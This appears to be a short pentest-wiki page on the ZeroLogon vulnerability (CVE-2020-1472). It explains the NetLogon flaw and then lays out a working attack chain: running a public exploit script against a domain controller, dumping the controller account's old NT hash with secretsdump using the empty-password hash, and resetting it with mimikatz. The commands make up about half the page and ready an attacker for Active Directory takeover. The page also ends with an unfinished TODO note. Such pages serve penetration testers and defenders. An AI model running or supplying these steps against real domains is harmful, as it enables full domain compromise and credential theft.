# 🛠️ ZeroLogon

## Theory

This attack exploits an insecure customized cryptographic protocol used in the NetLogon Remote Protocol. It allows attackers to change the password of the domain controller computer account, hence giving those attackers domain admin privileges.

## Practice

This exploit changes the NT hash of the domain controller computer account in the Active Directory, but not in the local SAM database, hence creating some issues in Active Directory domains. In order to prevent denial of service, attackers can exploit the CVE, find the NT hash of the domain controller machine account before it was changed, and set it back in the AD.

```bash
# Exploit the CVE (https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py)
python3 cve-2020-1472-exploit.py $DC_name $DC_IP

# (secretsdump) Find the old NT hash of the DC
secretsdump -history -just-dc-user 'DC_name$' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'DOMAIN/DC_name$@DC.DOMAIN'

# (mimikatz) Change the NT hash of the domain controller machine account in the AD back to its original value
lsadump::changentlm /server:'DC.DOMAIN'  /user:'DC_name$' /oldntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /newntlm:<old nt hash>
```

//TODO : study this in depth, espacially the hash history part, work on the stability

## References

{% embed url="https://www.secura.com/blog/zero-logon" caption="" %}

